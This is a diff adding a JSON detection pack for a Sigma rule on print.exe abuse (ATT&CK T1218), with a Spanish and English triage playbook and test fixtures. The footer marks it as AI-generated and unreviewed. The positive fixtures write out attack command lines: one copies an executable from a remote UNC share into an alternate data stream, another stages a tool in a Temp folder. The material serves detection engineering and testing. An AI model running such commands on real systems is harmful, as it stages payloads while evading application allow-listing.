@@ -1,0 +1,125 @@
+{
+  "rule": {
+    "id": "bafac3d6-7de9-4dd9-8874-4a1194b493ed",
+    "title": "Abusing Print Executable",
+    "level": "medium",
+    "status": "test",
+    "author": "Furkan CALISKAN, @caliskanfurkan_, @oscd_initiative",
+    "path": "windows/process_creation/proc_creation_win_print_remote_file_copy.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_print_remote_file_copy.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1218"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó print.exe con un destino /D y un .exe en la línea de comandos. Es una técnica conocida para copiar ejecutables, incluso desde recursos remotos o hacia flujos de datos alternos (ADS), usando un binario firmado de Windows.",
+      "what_it_detects": "Eventos de creación de procesos en los que Image termina en \\print.exe, CommandLine empieza por 'print' y contiene '/D' y '.exe'. Se excluyen las líneas que contienen 'print.exe', así que la regla solo coincide cuando el binario se invoca como 'print' sin extensión.",
+      "why_it_matters": "print.exe es un binario LOLBAS que copia cualquier archivo a la ruta indicada en /D:, por ejemplo un recurso UNC o un ADS como archivo.txt:tool.exe. Los atacantes lo usan para preparar payloads con discreción y evadir listas de aplicaciones permitidas (ATT&CK T1218, ejecución mediante binarios del sistema).",
+      "triage_steps": [
+        "Analice CommandLine: el valor de /D: es el destino y el último argumento es el origen. Anote rutas UNC (\\\\host\\share), nombres ADS con dos puntos y carpetas con permisos de escritura del usuario.",
+        "Si el origen es remoto, identifique el host o la IP y revise conexiones SMB (445) o WebDAV desde el endpoint hacia él en +/- 15 minutos.",
+        "Revise ParentImage y su línea de comandos. Es sospechoso un cmd.exe lanzado por Office, un intérprete de scripts, wmiprvse.exe o una shell remota.",
+        "Ubique el archivo de destino: obtenga su hash, firma y fecha de creación. Busque ADS con 'dir /r' o Get-Item -Stream.",
+        "Busque en el mismo host ejecuciones posteriores del archivo copiado, por ejemplo con wmic o rundll32, o procesos iniciados desde una ruta ADS.",
+        "Verifique la cuenta de usuario y busque alertas previas o comandos print similares en otros hosts del mismo usuario o del mismo recurso de origen."
+      ],
+      "false_positives": [
+        "La regla no indica ninguno. Casos poco comunes son scripts antiguos de despliegue o archivos batch que usan print para copiar binarios.",
+        "Pruebas autorizadas de red team o de LOLBAS que reproducen los ejemplos documentados de print /D."
+      ],
+      "response_steps": [
+        "Pida confirmación al responsable del script o el ticket de cambio. Si nadie puede justificar la actividad, trátela como maliciosa.",
+        "Aísle el endpoint si el binario copiado se ejecutó o si el recurso de origen es desconocido. Bloquee el host o la IP de origen.",
+        "Después de guardar copias para el análisis, elimine el archivo copiado y cualquier ADS. Luego busque y elimine la persistencia asociada.",
+        "Restablezca las credenciales del usuario si se usaron de forma indebida y busque el mismo hash y recurso en toda la organización."
+      ],
+      "severity_rationale": "El nivel medio es adecuado porque casi nunca se usa print.exe de forma legítima para copiar ejecutables, pero la alerta por sí sola solo muestra la preparación, no una ejecución o un impacto confirmados."
+    },
+    "en": {
+      "summary": "print.exe was started with a /D destination and an .exe in its command line. This is a known way to copy executables, including from remote shares or into alternate data streams (ADS), with a signed Windows binary.",
+      "what_it_detects": "Process creation events where Image ends with \\print.exe, CommandLine starts with 'print', and it contains both '/D' and '.exe'. Command lines containing 'print.exe' are excluded, so the rule only matches when the binary is called as 'print' with no extension.",
+      "why_it_matters": "print.exe is a LOLBAS binary that can copy any file to the path given in /D:, such as a UNC share or an ADS like file.txt:tool.exe. Attackers use it to stage payloads quietly while getting past application allow-listing (ATT&CK T1218, System Binary Proxy Execution).",
+      "triage_steps": [
+        "Parse CommandLine: the /D: value is the destination, the last argument is the source. Note any UNC paths (\\\\host\\share), colon-based ADS names and user-writable folders.",
+        "If the source is remote, find the host or IP and check SMB (445) or WebDAV connections from this endpoint to it within +/- 15 minutes.",
+        "Check ParentImage and its command line. cmd.exe launched by Office, a script host, wmiprvse.exe or a remote shell is suspicious.",
+        "Find the destination file: get its hash, signature and creation time, and look for an ADS with 'dir /r' or Get-Item -Stream.",
+        "Search for later execution of the copied file, such as wmic, rundll32 or a process started from an ADS path, on the same host.",
+        "Check the user account and look for earlier alerts or similar print commands on other hosts from the same user or source share."
+      ],
+      "false_positives": [
+        "Rule lists none. Rare cases are old batch or deployment scripts that use print to copy binaries.",
+        "Authorized red team or LOLBAS testing that runs the documented print /D examples."
+      ],
+      "response_steps": [
+        "Get the script owner or the change ticket to confirm the activity. If nobody can account for it, treat it as malicious.",
+        "Isolate the endpoint if the copied binary ran or the source share is unknown. Block the source host or IP.",
+        "After you save copies for analysis, remove the copied file and any ADS. Then find and remove any persistence created with it.",
+        "Reset the user's credentials if they were misused, and hunt for the same hash and share across the fleet."
+      ],
+      "severity_rationale": "Medium fits because print.exe is rarely used legitimately to copy executables, but on its own the alert only shows staging, not confirmed execution or impact."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "print copies a remote executable from a UNC share into an alternate data stream",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\print.exe",
+          "CommandLine": "print /D:C:\\Users\\Public\\Documents\\notes.txt:svc.exe \\\\198.51.100.20\\share\\svc.exe",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "ParentCommandLine": "cmd.exe /c stage.bat",
+          "CurrentDirectory": "C:\\Users\\jperez\\"
+        }
+      },
+      {
+        "description": "print copies a local executable to a new name in a user-writable folder",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mrojas",
+          "Image": "C:\\Windows\\System32\\print.exe",
+          "CommandLine": "print /D:C:\\Users\\mrojas\\AppData\\Local\\Temp\\updater.exe C:\\Users\\mrojas\\Downloads\\tool.exe",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "IntegrityLevel": "Medium"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Legitimate printing of a text file to a network printer; no .exe in the command line",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\print.exe",
+          "CommandLine": "print /D:\\\\prnsrv01.example.com\\HPLaser C:\\Users\\jperez\\Documents\\report.txt",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+        }
+      },
+      {
+        "description": "Full path invocation containing print.exe, excluded by filter_print and not starting with 'print'",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0311.andes.example.com",
+          "User": "ANDES\\lgomez",
+          "Image": "C:\\Windows\\System32\\print.exe",
+          "CommandLine": "C:\\Windows\\System32\\print.exe /D:C:\\Temp\\copy.exe C:\\Temp\\setup.exe",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
